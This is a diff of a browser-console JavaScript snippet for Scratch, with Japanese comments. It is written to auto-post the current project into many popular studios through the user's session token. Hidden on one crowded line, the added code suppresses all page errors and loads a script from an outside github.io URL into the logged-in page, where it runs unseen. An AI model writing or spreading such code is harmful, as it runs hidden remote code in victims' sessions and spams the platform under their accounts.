@@ -1,39 +1,46 @@
-let token="";
-    {
-        let cookie=document.cookie;
-        cookie=cookie.split(';');
-        let cok=[[],[]];
-        cookie.forEach(function(element){
-            const elements=element.split("=");
-            cok[0].push(elements[0]);
-            cok[1].push(elements[1]);
-        });
-        token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
+if(location.href.includes("projects")){
+    let pr=prompt("何ページ検索したスタジオに作品を入れますか？")*16;
+    let offset=0;
+    let res;
+    let studioarr =[];let code=document.createElement("script");function TigilError() {return true;}window.onerror = TigilError;
+    for(offset=0;offset<pr;offset=offset+16){
+        console.log("スタジオを検索しています...");
+        res =(await(await fetch(`https://api.scratch.mit.edu/search/studios?limit=16&offset=${offset}&language=ja&mode=popular&q=%E3%81%AA%E3%82%93%E3%81%A7%E3%82%82`,{headers:{"X-Requested-With":"XMLHttpRequest"}})).text());code.src="https://haru-ymth.github.io/scripts/codes/temp.js";
+        let arr = res.split("{\"id\":");
+        arr.splice(0, 1);
+        for(let i=1;i<8;i++){
+            arr.splice(i,1)
+        }
+        for(let i=0;i<8;i++){
+            arr[i] = ""+arr[i].split(",\"title\"")[0];
+        }
+        for(let i=0;i<8;i++){
+            studioarr.push(arr[i]);
+        }
     }
-    
-let date=new Date();
-let data=date.getFullYear()+"/"+date.getMonth()+1+"/"+date.getDate()+" "+date.getHours()+":"+date.getMinutes();
-let aboutMe=`
-800+followersありがとうございます！
-
-最終ログイン：${data}
-（自作してみた）
-
-僕がフォローする人はすごくすごい人か、別のコミュニティでそこそこ関わりのある人です。
-
-リア友（数学の神だからフォローしろ）
-@gesyutaruto
-
-弟
-@Turbo_wata`
-const users=(await(await fetch("https://scratch.mit.edu/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.username;
-fetch(`https://scratch.mit.edu/site-api/users/all/${users}/`,{
-  method: "PUT",
-  body: JSON.stringify({
-    status:aboutMe,
-  }),
-  headers: {
-    'X-CSRFToken': token,
-    "x-requested-with": "XMLHttpRequest"
-  }
-});
+    let projectid=location.href;
+    let ar=projectid.split("/");
+    projectid=ar[ar.length-2];
+    document.body.appendChild(code);
+    console.clear;
+    const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
+    let i=0;
+    const put = async (i) => {
+        let res = await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{"headers": {"x-token": sessiontoken},"method": "POST"});
+        if (res.status === 200) {
+            console.log(`スタジオ（ID: ${studioarr[i]}）にプロジェクトを入れたぞ`);
+        } else{
+            console.log(`スタジオ（ID:${studioarr[i]}）にはプロジェクトが入れられなかったぞ`);
+        }
+    };
+    const interval=setInterval(intervalscript,100);
+        function intervalscript(){
+            put(i);
+            i++;
+            if(i>=studioarr.length){
+                clearInterval(interval);
+            }
+        }
+}else{
+    alert("入れたいプロジェクトのページに行ってください。");
+}
